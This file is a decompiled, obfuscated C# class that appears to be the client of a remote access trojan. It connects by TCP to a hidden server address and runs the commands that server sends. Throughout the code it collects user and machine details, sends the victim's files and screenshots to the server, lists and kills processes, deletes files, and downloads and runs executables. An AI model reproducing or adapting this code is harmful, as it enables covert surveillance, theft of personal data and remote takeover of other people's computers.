using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace nirtbivaes;

public class MEEADRM
{
	private MRAEINF nirtbivaesUPC;

	public DateTime nirtbivaesrunTime;

	private int nirtbivaesscrSize = 200;

	private ThreadStart nirtbivaesfunStarter;

	public TcpClient nirtbivaestcpsck;

	public NetworkStream nirtbivaesnetStream;

	private int nirtbivaesbuffSize = 1024;

	private DIRZARIVF nirtbivaesHD = new DIRZARIVF();

	public bool nirtbivaesis_working = false;

	private Dictionary<string, byte[]> nirtbivaestasks = new Dictionary<string, byte[]>();

	private int nirtbivaesbytesRead = 0;

	public bool nirtbivaesreqCnls = false;

	public bool nirtbivaesautCnls = false;

	public DateTime nirtbivaeslTimeUtc;

	private THARAARE nirtbivaesStateObj = new THARAARE();

	private bool nirtbivaesiswitch = false;

	public int port_sn = 0;

	private bool nirtbivaesthrRuning = false;

	private bool nirtbivaesstr_writer = false;

	private bool nirtbivaescapScreen = false;

	private Thread nirtbivaesfunThread;

	private MemoryStream msStram = new MemoryStream();

	private SCWRARNS nirtbivaescaps = new SCWRARNS();

	private Bitmap image;

	public void nirtbivaessaveFile(string filePath)
	{
		try
		{
			byte[] array = nirtbivaespull_data();
			if (array != null)
			{
				File.WriteAllBytes(filePath, array);
			}
		}
		catch
		{
		}
	}

	public string nirtbivaesfile_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|nirtbivaes".Split(new char[1] { '|' })[0] : "<|nirtbivaes".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|nirtbivaes".Split(new char[1] { '|' })[0] : "<|nirtbivaes".Split(new char[1] { '|' })[0]);
			text = text + nirtbivaesget_size(fileInfo.Length) + ((!ret) ? ">|nirtbivaes".Split(new char[1] { '|' })[0] : "<|nirtbivaes".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				nirtbivaespush_data(null, "nirtbivaes@filsz=|nirtbivaes".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "".ToString();
		}
	}

	public void nirtbivaesdo_start()
	{
		try
		{
			nirtbivaesrunTime = DateTime.Now;
			CEDAZRNF.nirtbivaesport = CEDAZRNF.ports[0];
			nirtbivaesUPC = new MRAEINF();
			nirtbivaesHD.iserver = this;
			nirtbivaesHD.nirtbivaesmainPath = CEDAZRNF.nirtbivaesget_mpath();
			TimerCallback callback = nirtbivaeslookupCon;
			Timer nirtbivaestimer = new Timer(callback, nirtbivaesStateObj, 61210, 65210);
			nirtbivaesStateObj.nirtbivaestimer = nirtbivaestimer;
		}
		catch (Exception)
		{
		}
	}

	private bool nirtbivaesISCons()
	{
		try
		{
			CEDAZRNF.nirtbivaesdefaultP = nirtbivaesserverIPD();
			nirtbivaestcpsck = new TcpClient();
			nirtbivaestcpsck.Connect(CEDAZRNF.nirtbivaesdefaultP, CEDAZRNF.nirtbivaesport);
			return true;
		}
		catch (Exception)
		{
			nirtbivaesports_switch();
			return false;
		}
	}

	public void nirtbivaesports_switch()
	{
		try
		{
			port_sn++;
			CEDAZRNF.nirtbivaesport = CEDAZRNF.ports[port_sn];
			if (port_sn >= CEDAZRNF.ports.Length - 1)
			{
				port_sn = 0;
			}
		}
		catch
		{
			port_sn = 0;
		}
	}

	public bool nirtbivaessend_auto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">" + fileName;
				nirtbivaespush_data(data, "nirtbivaes@afile=" + fileinfo);
				return false;
			}
			nirtbivaespush_data(null, "nirtbivaes@anfod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	private void nirtbivaeslookupCon(object disurce)
	{
		try
		{
			if (!nirtbivaesthrRuning)
			{
				nirtbivaesthrRuning = true;
				nirtbivaescheckLastatime(DateTime.Now);
				if (!nirtbivaesis_working || !nirtbivaestcpsck.Connected)
				{
					nirtbivaesis_working = nirtbivaesISCons();
					if (nirtbivaesis_working)
					{
						nirtbivaesbuffSize = nirtbivaestcpsck.ReceiveBufferSize;
						nirtbivaesseeRspx();
					}
				}
			}
			nirtbivaesthrRuning = false;
		}
		catch (Exception)
		{
			nirtbivaesthrRuning = false;
			nirtbivaesstr_writer = false;
			nirtbivaesis_working = false;
			nirtbivaesiswitch = false;
		}
	}

	public void nirtbivaeslist_processes(string cmd)
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				try
				{
					text = text + processes[i].Id + ">|nirtbivaes".Split(new char[1] { '|' })[0];
					text = text + processes[i].ProcessName + ">|nirtbivaes".Split(new char[1] { '|' })[0];
					text += "0>|nirtbivaes".Split(new char[1] { '|' })[0];
					text += "<";
				}
				catch
				{
				}
			}
			byte[] byteArray = CEDAZRNF.getByteArray(text);
			nirtbivaespush_data(byteArray, cmd + "=prodcess|nirtbivaes".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void nirtbivaesload_app()
	{
		try
		{
			string path = CEDAZRNF.nirtbivaesget_mpath() + CEDAZRNF.nirtbivaesmainApp + ".exe|nirtbivaes".Split(new char[1] { '|' })[0].ToString();
			Thread.Sleep(12);
			CEDAZRNF.nirtbivaesset_run("risab|nirtbivaes".Split(new char[1] { '|' })[0], path);
		}
		catch
		{
		}
	}

	private void nirtbivaesimage_info(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">|nirtbivaes".Split(new char[1] { '|' })[0];
				text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|nirtbivaes".Split(new char[1] { '|' })[0];
				text = text + nirtbivaesget_size(fileInfo.Length) + ">";
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
				nirtbivaespush_data(memoryStream.ToArray(), "nirtbivaes@thumb=|nirtbivaes".Split(new char[1] { '|' })[0] + text);
			}
		}
		catch
		{
		}
	}

	private void nirtbivaessee_scren(string screenSize)
	{
		try
		{
			nirtbivaesscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			image = nirtbivaescaps.nirtbivaesscreen(nirtbivaesscrSize);
			msStram.SetLength(0L);
			((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
			nirtbivaespush_data(msStram.ToArray(), "nirtbivaes@sascr=nirtbivaes|nirtbivaes".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void nirtbivaesis_screen(string screenSize)
	{
		try
		{
			nirtbivaesscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			while (nirtbivaescapScreen && nirtbivaesis_working)
			{
				image = nirtbivaescaps.nirtbivaesscreen(nirtbivaesscrSize);
				msStram.SetLength(0L);
				((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
				nirtbivaespush_data(msStram.ToArray(), "nirtbivaes@scren=nirtbivaes|nirtbivaes".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private void nirtbivaesuser_info()
	{
		try
		{
			string text = nirtbivaesUPC.nirtbivaeslancard + "|" + nirtbivaesUPC.nirtbivaescname + "-2|" + nirtbivaesUPC.nirtbivaesuname + "|" + nirtbivaesUPC.nirtbivaesuip + "|" + CEDAZRNF.nirtbivaesOsname() + "|" + nirtbivaesUPC.nirtbivaesapver + "|";
			text += "| !nirtbivaes".Split(new char[1] { '!' })[0];
			text = text + "|" + nirtbivaesUPC.nirtbivaesclientNum;
			text = text + "|" + CEDAZRNF.nirtbivaesget_mpath();
			byte[] byteArray = CEDAZRNF.getByteArray(text);
			nirtbivaespush_data(byteArray, "nirtbivaes@info=user|nirtbivaes".Split(new char[1] { '|' })[0]);
		}
		catch (Exception)
		{
		}
	}

	private void nirtbivaespush_file(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				nirtbivaespush_data(File.ReadAllBytes(lfile), "nirtbivaes@file=|nirtbivaes".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName, tmp: true);
			}
		}
		catch
		{
		}
	}

	private string nirtbivaesget_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|nirtbivaes".Split(new char[1] { '|' })[0],
				"KB|nirtbivaes".Split(new char[1] { '|' })[0],
				"MB|nirtbivaes".Split(new char[1] { '|' })[0],
				"GB|nirtbivaes".Split(new char[1] { '|' })[0],
				"TB|nirtbivaes".Split(new char[1] { '|' })[0],
				"PB|nirtbivaes".Split(new char[1] { '|' })[0],
				"EB|nirtbivaes".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "0";
		}
	}

	public string[] nirtbivaesget_command()
	{
		try
		{
			byte[] array = new byte[5];
			nirtbivaesbytesRead = nirtbivaesnetStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= nirtbivaesbytesRead)
			{
				int count = ((num3 > nirtbivaesbuffSize) ? nirtbivaesbuffSize : num3);
				nirtbivaesbytesRead = nirtbivaesnetStream.Read(array2, num2, count);
				num2 += nirtbivaesbytesRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == "")
			{
				return null;
			}
			return text.Split(new char[1] { '=' });
		}
		catch
		{
			nirtbivaesis_working = false;
			return null;
		}
	}

	private void nirtbivaescheckLastatime(DateTime mTimeUtc)
	{
		try
		{
			if (Math.Abs(nirtbivaesrunTime.Subtract(mTimeUtc).Minutes) > 4)
			{
				nirtbivaestcpsck.Close();
				nirtbivaesis_working = false;
			}
		}
		catch
		{
		}
	}

	public byte[] nirtbivaespull_data()
	{
		try
		{
			int num = 0;
			byte[] array = new byte[5];
			nirtbivaesbytesRead = nirtbivaesnetStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !nirtbivaesreqCnls)
			{
				int count = ((num3 > nirtbivaesbuffSize) ? nirtbivaesbuffSize : num3);
				nirtbivaesbytesRead = nirtbivaesnetStream.Read(array2, num, count);
				num += nirtbivaesbytesRead;
				num3 -= nirtbivaesbytesRead;
				nirtbivaesrunTime = DateTime.Now;
			}
			if (nirtbivaesreqCnls)
			{
				nirtbivaesnetStream.Flush();
				while (nirtbivaesnetStream.DataAvailable && nirtbivaesnetStream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			nirtbivaesis_working = false;
			return null;
		}
	}

	private void nirtbivaeslistDrives()
	{
		string text = nirtbivaesHD.nirtbivaeslookup_Drives();
		nirtbivaespush_data(null, "nirtbivaes@dirs=" + text);
	}

	private void nirtbivaesseeRspx()
	{
		if (!nirtbivaesiswitch)
		{
			nirtbivaesiswitch = true;
			nirtbivaesnetStream = nirtbivaesNS(nirtbivaestcpsck);
			nirtbivaescapScreen = false;
			while (nirtbivaesis_working)
			{
				string[] switchType = nirtbivaesget_command();
				if (switchType != null)
				{
					nirtbivaesreqCnls = false;
					string cmdInfo = switchType[0].ToLower();
					if (cmdInfo.Split(new char[1] { '@' }).Length > 1)
					{
						cmdInfo = "nirtbivaes@" + cmdInfo.Split(new char[1] { '@' })[1];
					}
					else
					{
						cmdInfo = "nirtbivaes@" + cmdInfo;
					}
					if (cmdInfo == "nirtbivaes@info")
					{
						nirtbivaesuser_info();
						continue;
					}
					if (cmdInfo == "nirtbivaes@filsz")
					{
						nirtbivaesfunStarter = delegate
						{
							nirtbivaesfile_info(switchType[1].ToString());
						};
						nirtbivaesfunThread = new Thread(nirtbivaesfunStarter);
						nirtbivaesfunThread.Start();
						continue;
					}
					if (cmdInfo == "nirtbivaes@fldr")
					{
						string Folders = nirtbivaesHD.nirtbivaescheck_Folder(switchType[1]);
						if (Folders != "")
						{
							nirtbivaesfunStarter = delegate
							{
								nirtbivaespush_data(null, "nirtbivaes@fldr=|nirtbivaes".Split(new char[1] { '|' })[0] + Folders);
							};
							nirtbivaesfunThread = new Thread(nirtbivaesfunStarter);
							nirtbivaesfunThread.Start();
						}
						continue;
					}
					if (cmdInfo == "nirtbivaes@endpo")
					{
						try
						{
							Process.GetProcessById(Convert.ToInt16(switchType[1].Trim().ToString())).Kill();
						}
						catch
						{
						}
						continue;
					}
					if (cmdInfo == "nirtbivaes@thumb")
					{
						nirtbivaesimage_info(switchType[1].ToString());
						continue;
					}
					switch (cmdInfo.ToString())
					{
					case "nirtbivaes@runf":
						nirtbivaesdo_process(switchType[1].Split(new char[1] { '>' })[0]);
						break;
					case "nirtbivaes@procl":
						nirtbivaesfunStarter = delegate
						{
							nirtbivaeslist_processes(cmdInfo);
						};
						nirtbivaesfunThread = new Thread(nirtbivaesfunStarter);
						nirtbivaesfunThread.Start();
						break;
					case "nirtbivaes@cscreen":
						nirtbivaessee_scren(switchType[1]);
						break;
					case "nirtbivaes@clping":
						nirtbivaesrunTime = DateTime.Now;
						break;
					case "nirtbivaes@dowr":
					case "nirtbivaes@dowf":
						nirtbivaessaveFile(switchType[1]);
						break;
					case "nirtbivaes@scren":
						nirtbivaescapScreen = true;
						nirtbivaesfunStarter = delegate
						{
							nirtbivaesis_screen(switchType[1]);
						};
						nirtbivaesfunThread = new Thread(nirtbivaesfunStarter);
						nirtbivaesfunThread.Start();
						break;
					case "nirtbivaes@dirs":
						nirtbivaesfunThread = new Thread(nirtbivaeslistDrives);
						nirtbivaesfunThread.Start();
						break;
					case "nirtbivaes@listf":
						nirtbivaesfunStarter = delegate
						{
							nirtbivaesHD.nirtbivaeslook_File(switchType[1]);
						};
						nirtbivaesfunThread = new Thread(nirtbivaesfunStarter);
						nirtbivaesfunThread.Start();
						break;
					case "nirtbivaes@file":
						nirtbivaesfunStarter = delegate
						{
							nirtbivaespush_file(switchType[1]);
						};
						nirtbivaesfunThread = new Thread(nirtbivaesfunStarter);
						nirtbivaesfunThread.Start();
						break;
					case "nirtbivaes@afile":
						nirtbivaesfunStarter = delegate
						{
							nirtbivaessend_auto(switchType[1]);
						};
						nirtbivaesfunThread = new Thread(nirtbivaesfunStarter);
						nirtbivaesfunThread.Start();
						break;
					case "nirtbivaes@fles":
					{
						string files = nirtbivaesHD.nirtbivaeslookup_File(switchType[1]);
						if (files != "")
						{
							nirtbivaesfunStarter = delegate
							{
								nirtbivaespush_data(null, "nirtbivaes@fles=|nirtbivaes".Split(new char[1] { '|' })[0] + files);
							};
							nirtbivaesfunThread = new Thread(nirtbivaesfunStarter);
							nirtbivaesfunThread.Start();
						}
						break;
					}
					case "nirtbivaes@cnls":
						nirtbivaesautCnls = true;
						nirtbivaesreqCnls = true;
						nirtbivaescapScreen = false;
						break;
					case "nirtbivaes@udlt":
						nirtbivaesremove_user();
						break;
					case "nirtbivaes@delt":
						File.Delete(switchType[1]);
						break;
					}
					continue;
				}
				nirtbivaesis_working = false;
				break;
			}
			nirtbivaesis_working = false;
			nirtbivaescapScreen = false;
		}
		nirtbivaesiswitch = false;
	}

	public NetworkStream nirtbivaesNS(TcpClient nirtbivaestcpsck)
	{
		return nirtbivaestcpsck.GetStream();
	}

	public string nirtbivaesserverIPD()
	{
		return Encoding.UTF8.GetString(CEDAZRNF.nirtbivaesvpsips, 0, CEDAZRNF.nirtbivaesvpsips.Length);
	}

	public void nirtbivaesdo_process(string filePath)
	{
		try
		{
			Process.Start(filePath);
		}
		catch
		{
		}
	}

	public void nirtbivaesremove_user()
	{
		try
		{
			byte[] bytes = nirtbivaespull_data();
			if (!File.Exists(CEDAZRNF.nirtbivaesget_mpath() + CEDAZRNF.nirtbivaesremvUser + ".exe"))
			{
				File.WriteAllBytes(CEDAZRNF.nirtbivaesget_mpath() + CEDAZRNF.nirtbivaesremvUser + ".exe", bytes);
			}
			nirtbivaesdo_process(CEDAZRNF.nirtbivaesget_mpath() + CEDAZRNF.nirtbivaesremvUser + ".exe".ToString());
		}
		catch
		{
		}
	}

	public bool nirtbivaespush_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			if (nirtbivaesstr_writer)
			{
				return false;
			}
			nirtbivaesstr_writer = true;
			byte[] byteArray = CEDAZRNF.getByteArray(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(byteArray.Length);
			byte[] array2 = new byte[num2 + byteArray.Length + num];
			bytes.CopyTo(array2, 0);
			byteArray.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + byteArray.Length);
				data.CopyTo(array2, 10 + byteArray.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !nirtbivaesreqCnls)
			{
				int num5 = ((num4 > nirtbivaesbuffSize) ? nirtbivaesbuffSize : num4);
				nirtbivaesnetStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
				nirtbivaesrunTime = DateTime.Now;
			}
			nirtbivaesstr_writer = false;
			if (nirtbivaesreqCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			nirtbivaesstr_writer = false;
			nirtbivaesis_working = false;
			return false;
		}
	}
}
